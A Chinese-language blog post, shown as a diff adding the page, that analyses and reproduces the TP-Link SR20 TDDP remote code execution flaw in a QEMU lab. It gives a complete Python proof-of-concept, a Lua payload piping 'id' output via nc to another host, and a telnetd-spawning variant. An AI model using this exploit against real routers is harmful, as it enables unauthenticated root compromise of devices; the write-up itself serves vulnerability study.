@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <meta name="baidu-site-verification" content="L6Lm9d5Crl">
+  
+  
+  
+  
+  <title>TP Link SR20 ACE漏洞分析 | Ordin</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="info">
+<meta name="keywords" content="IOT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TP Link SR20 ACE漏洞分析">
+<meta property="og:url" content="https://leave-Devour.github.io/2020/08/04/TP-Link-SR20-ACE漏洞分析/index.html">
+<meta property="og:site_name" content="Ordin">
+<meta property="og:description" content="info">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200803172348831.png">
+<meta property="og:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200803172506223.png">
+<meta property="og:image" content="https://leave-devour.github.io/images/image-20200803173548905.png">
+<meta property="og:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200803175414831.png">
+<meta property="og:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200803175436714.png">
+<meta property="og:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200804092740755.png">
+<meta property="og:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200804092832845.png">
+<meta property="og:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200804092905412.png">
+<meta property="og:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200804092925430.png">
+<meta property="og:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200804092950282.png">
+<meta property="og:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200804093025453.png">
+<meta property="og:updated_time" content="2020-08-04T01:32:49.200Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TP Link SR20 ACE漏洞分析">
+<meta name="twitter:description" content="info">
+<meta name="twitter:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200803172348831.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Ordin" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/avatar.png" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Ordin</a></h1>
+        </hgroup>
+        
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="/archives/">博客主页</a></li>
+                        
+                            <li><a  href="/archives/">所有文章</a></li>
+                        
+                            <li><a  href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github"  target="_blank" href="https://github.com/leave-Devour" title="github">github</a>
+                            
+                                <a class="fl weibo"  target="_blank" href="https://weibo.com/u/7351903473" title="weibo">weibo</a>
+                            
+                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Automation/" style="font-size: 15px;">Automation</a> <a href="/tags/CVE/" style="font-size: 10px;">CVE</a> <a href="/tags/IOT/" style="font-size: 10px;">IOT</a> <a href="/tags/STL分析/" style="font-size: 10px;">STL分析</a> <a href="/tags/Vmare/" style="font-size: 10px;">Vmare</a> <a href="/tags/kernel/" style="font-size: 15px;">kernel</a> <a href="/tags/linux-kernel-pwn/" style="font-size: 15px;">linux kernel pwn</a> <a href="/tags/pwnable-kr/" style="font-size: 10px;">pwnable.kr</a> <a href="/tags/reversing-kr/" style="font-size: 10px;">reversing.kr</a> <a href="/tags/刷题/" style="font-size: 20px;">刷题</a> <a href="/tags/复现/" style="font-size: 15px;">复现</a> <a href="/tags/漏洞分析/" style="font-size: 10px;">漏洞分析</a>
+                    </div>
+                </section>
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.cnblogs.com/liyuechan/">csdn</a>
+                    
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">ture</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Ordin</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/avatar.png" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Ordin</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/archives/">博客主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://github.com/leave-Devour" title="github">github</a>
+                    
+                        <a class="weibo" target="_blank" href="https://weibo.com/u/7351903473" title="weibo">weibo</a>
+                    
+                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                    
+                </div>
+            </nav>
+        </header>
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-TP-Link-SR20-ACE漏洞分析" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2020/08/04/TP-Link-SR20-ACE漏洞分析/" class="article-date">
+      <time datetime="2020-08-04T01:31:26.000Z" itemprop="datePublished">2020-08-04</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      TP Link SR20 ACE漏洞分析
+    </h1>
+  
+
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/PWN/">PWN</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IOT/">IOT</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <center><font size="5">info</font></center>
+<a id="more"></a>
+
+<p>漏洞的基理为：TP-Link SR20 设备运行了 V1 版本的 TDDP 协议，V1 版本无需认证，只需往 SR20 设备的 UDP 1040 端口发送数据，且数据的第二字节为 <code>0x31</code> 时，SR20 设备会连接发送该请求设备的 TFTP 服务下载相应的文件并使用 LUA 解释器以 root 权限来执行，这就导致存在远程代码执行漏洞</p>
+<p>固件下载地址：<a href="https://www.tp-link.com/us/support/download/sr20/#Firmware" target="_blank" rel="noopener">SP20</a></p>
+<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20200803172348831.png" alt="image-20200803172348831"></p>
+<p>TDDP协议的逆向分析 [Reverse Engineering the TP-Link HS110]([<a href="https://www.softscheck.com/en/reverse-engineering-tp-link-hs110/#TP-Link%20Device%20Debug%20Protocol]" target="_blank" rel="noopener">https://www.softscheck.com/en/reverse-engineering-tp-link-hs110/#TP-Link%20Device%20Debug%20Protocol]</a>(<a href="https://www.softscheck.com/en/reverse-engineering-tp-link-hs110/#TP-Link" target="_blank" rel="noopener">https://www.softscheck.com/en/reverse-engineering-tp-link-hs110/#TP-Link</a> Device Debug Protocol))</p>
+<p><a href="https://www.troopers.de/downloads/troopers17/TR17_fgont_-iot_tp_link_hacking.pdf" target="_blank" rel="noopener">pdf</a></p>
+<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20200803172506223.png" alt="image-20200803172506223"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一个字节是版本号，第二个是类型</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>先安装<code>lua</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -R -O http://www.lua.org/ftp/lua-5.3.0.tar.gz</span><br><span class="line">tar zxf lua-5.3.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> lua-5.3.0</span><br><span class="line">make linux <span class="built_in">test</span></span><br><span class="line">make install</span><br><span class="line"><span class="comment">#curl 慢的可以下载好再拖进虚拟机</span></span><br></pre></td></tr></table></figure>
+
+<p>然后就安装<code>tftp</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install atftpd ftp  openbsd-inetd libreadline-dev</span><br></pre></td></tr></table></figure>
+
+<p>然后配置 <code>/ect/default/atftpd</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">USE_INETD=<span class="literal">false</span> <span class="comment">#改成false</span></span><br><span class="line">OPTIONS=<span class="string">"--tftpd-timeout 300 --retry-timeout 5 --mcast-port 1758 --mcast-addr 239.239.239.0-255 --mcast-ttl 1 --maxthread 100 --verbose=5 /opt/ftp"</span></span><br><span class="line"><span class="comment">#改下后面的地址</span></span><br><span class="line"></span><br><span class="line">sudo mkdir /opt/ftp</span><br><span class="line">sudo chmod 777 /opt/ftp</span><br><span class="line"><span class="comment">#之后 ftp传文件就从这个目录传，这个默认为传文件的根目录</span></span><br><span class="line">sudo systemctl start atftpd</span><br><span class="line">sudo systemctl status atftpd <span class="comment">#这个查看下状态 状态要像下面这样，不然就是失败的</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20200803173548905.png" alt="image-20200803173548905"></p>
+<p>然后在ftp的目录下面新建一个文件，用以给 tddp 通过tftp 读取并执行</p>
+<p>文件的内容大概如下</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">config_test</span><span class="params">(config)</span></span></span><br><span class="line">  <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">"id | nc  192.168.2.1 9999"</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p>然后用qemu把环境起起来</p>
+<p>先把 <code>squashfs-root</code> 目录打包好，然后用 python -m SimpleHTTPServer 传进虚拟机</p>
+<p>想传还得把qemu虚拟机和本地虚拟机搭建一个局域网网络</p>
+<p>然后就建立网卡</p>
+<p>本地虚拟机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t tap0 -u `whoami`</span><br><span class="line">sudo ifconfig tap0 192.168.2.1/24</span><br></pre></td></tr></table></figure>
+
+<p>启动qemu虚拟机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-arm -M versatilepb -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append <span class="string">"root=/dev/sda1"</span>  -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br><span class="line"></span><br><span class="line">sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 -append <span class="string">"root=/dev/mmcblk0p2"</span> -net nic -net tap -nographic</span><br></pre></td></tr></table></figure>
+
+<p>两个都可以，一个 <code>hard floting</code>,另一个是<code>soft floting</code>  在armhf 的效率高，但要硬件支持</p>
+<p>具体的区别看这个链接：<a href="https://stackoverflow.com/questions/3321468/whats-the-difference-between-hard-and-soft-floating-point-numbers" target="_blank" rel="noopener">区别</a> <a href="https://blog.csdn.net/yuanlu837/article/details/12502313" target="_blank" rel="noopener">区别</a></p>
+<p>进入qemu虚拟机，账号密码都是 root</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.2.2/24 <span class="comment"># 配置网卡</span></span><br><span class="line">wget http://ip:port/filename</span><br><span class="line"><span class="comment">#下载文件</span></span><br><span class="line">sudo mount -o <span class="built_in">bind</span> /dev ./squashfs-root/dev <span class="comment">#将固件文件系统下的dev目录挂载到虚拟机/dev</span></span><br><span class="line">sudo mount -t proc /proc ./squashfs-root/proc <span class="comment">#将固件文件系统下的proc目录挂载到虚拟机/proc</span></span><br><span class="line">挂载文件，然后用chroot起</span><br><span class="line">chroot . sh</span><br></pre></td></tr></table></figure>
+
+<p>环境好了，就开始复现了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#qemu 虚拟机</span><br><span class="line">#先运行tddp</span><br><span class="line">./usr/bin/tddp</span><br><span class="line"># 运行nc 监听本地端口，因为执行 lua脚本会返回一个请求</span><br><span class="line">nc -lvnp  9999</span><br></pre></td></tr></table></figure>
+
+<p>运行poc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copyright 2019 Google LLC.</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: Apache-2.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a file in your tftp directory with the following contents:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#function config_test(config)</span></span><br><span class="line"><span class="comment">#  os.execute("telnetd -l /bin/login.sh")</span></span><br><span class="line"><span class="comment">#end</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Execute script as poc.py remoteaddr filename</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">port_send = <span class="number">1040</span></span><br><span class="line">port_receive = <span class="number">61000</span></span><br><span class="line"></span><br><span class="line">tddp_ver = <span class="string">"01"</span></span><br><span class="line">tddp_command = <span class="string">"31"</span></span><br><span class="line">tddp_req = <span class="string">"01"</span></span><br><span class="line">tddp_reply = <span class="string">"00"</span></span><br><span class="line">tddp_padding = <span class="string">"%0.16X"</span> % <span class="number">00</span></span><br><span class="line"></span><br><span class="line">tddp_packet = <span class="string">""</span>.join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])</span><br><span class="line"></span><br><span class="line">sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">sock_receive.bind((<span class="string">''</span>, port_receive))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send a request</span></span><br><span class="line">sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">packet = binascii.unhexlify(tddp_packet)</span><br><span class="line">argument = <span class="string">"%s;arbitrary"</span> % sys.argv[<span class="number">2</span>]</span><br><span class="line">packet = packet + argument.encode()</span><br><span class="line">sock_send.sendto(packet, (sys.argv[<span class="number">1</span>], port_send))</span><br><span class="line">sock_send.close()</span><br><span class="line"></span><br><span class="line">response, addr = sock_receive.recvfrom(<span class="number">1024</span>)</span><br><span class="line">r = response.encode(<span class="string">'hex'</span>)</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20200803175414831.png" alt="image-20200803175414831"></p>
+<p>然后</p>
+<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20200803175436714.png" alt="image-20200803175436714"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>poc的利用链</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_971C() -&gt; sub_936C() -&gt; sub_16418() -&gt; sub_15E74() -&gt; sub_A580() -&gt; sub_91DC()</span><br><span class="line">-&gt; execve(&quot;/bin/sh&quot;, &amp;argv, 0);</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20200804092740755.png" alt="image-20200804092740755"></p>
+<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20200804092832845.png" alt="image-20200804092832845"></p>
+<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20200804092905412.png" alt="image-20200804092905412"></p>
+<p>第二个字节</p>
+<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20200804092925430.png" alt="image-20200804092925430"></p>
+<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20200804092950282.png" alt="image-20200804092950282"></p>
+<p>从参数上就能看道是通过tftp来执行命令</p>
+<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20200804093025453.png" alt="image-20200804093025453"></p>
+<p>参考链接</p>
+<p><a href="https://mjg59.dreamwidth.org/51672.html" target="_blank" rel="noopener">挖洞的作者</a></p>
+<p><a href="https://ray-cp.github.io/archivers/tp_link_sr20_ace" target="_blank" rel="noopener">raycp</a></p>
+<p><a href="https://paper.seebug.org/879/" target="_blank" rel="noopener">404dalao</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a  href="/2020/08/04/TP-Link-SR20-ACE漏洞分析/">TP Link SR20 ACE漏洞分析</a></p>
+        <p><span>文章作者:</span><a  href="/" title="访问 Ordin 的个人博客">Ordin</a></p>
+        <p><span>发布时间:</span>2020年08月04日 - 09时31分</p>
+        <p><span>最后更新:</span>2020年08月04日 - 09时32分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2020/08/04/TP-Link-SR20-ACE漏洞分析/" title="TP Link SR20 ACE漏洞分析">https://leave-Devour.github.io/2020/08/04/TP-Link-SR20-ACE漏洞分析/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://leave-Devour.github.io/2020/08/04/TP-Link-SR20-ACE漏洞分析/　　作者: Ordin" title=""></span>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+  
+    <a  href="/2020/07/17/CVE-2019-18634分析/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">CVE-2019-18634分析</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞复现"><span class="toc-number">1.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#环境搭建"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <section class="changyan" id="comments">
+  <!--<div id="uyan_frame"></div>-->
+  <div id="SOHUCS"></div>
+  <script charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/changyan.js"></script>
+  <script type="text/javascript">
+    window.changyan.api.config({
+      appid: 'xxxx',
+      conf: 'xxxxxxxxx'
+    });
+  </script>
+</section>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a  href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a  href="/2020/07/17/CVE-2019-18634分析/" title="下一篇: CVE-2019-18634分析">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/08/04/TP-Link-SR20-ACE漏洞分析/">TP Link SR20 ACE漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/17/CVE-2019-18634分析/">CVE-2019-18634分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/15/虚拟机扩容/">虚拟机扩容</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/11/2020年网鼎杯pwn 复现/">2020年网鼎杯pwn 复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/09/c++中容器 list和vector分析/">c++中容器 list和vector分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/07/De1CTF2020-web复现/">De1CTF2020 web复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/06/一道题学习文件包含/">一道题学习文件包含</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/05/ThinkPHP-5-x远程命令执行漏洞分析与复现/">ThinkPHP 5.x远程命令执行漏洞分析与复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/04/BUUOJ刷题-2/">BUUOJ刷题(2)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/04/BUUOJ刷题-1/">BUUOJ刷题(1)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/02/Linux-kernel-整数溢出-堆溢出漏洞及其利用与分析/">Linux kernel 整数溢出-堆溢出漏洞及其利用与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/14/(转载自360安全客)高校战疫的两道kernel/">(转载自360安全客)从高校战疫的两道kernel学习kernel</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/14/AFL安装/">AFL安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/12/kernel-pwn-ret2usr-and-rop/">kernel pwn ret2usr and rop</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/12/angr安装/">angr安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/12/p4fmt-TeaserCONFidence2019-CTF/">p4fmt TeaserCONFidence2019 CTF </a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/23/reversing-kr-Easy-crack/">Easy_crack</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/23/Pwnable-kr-input/">input</a></li></ul>
+    
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+    <script>
+        $(".post-list").addClass("toc-article");
+        // $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
+
+
+
+
+    <script>
+        
+    </script>
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2020 Ordin
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
+            </div>
+        </div>
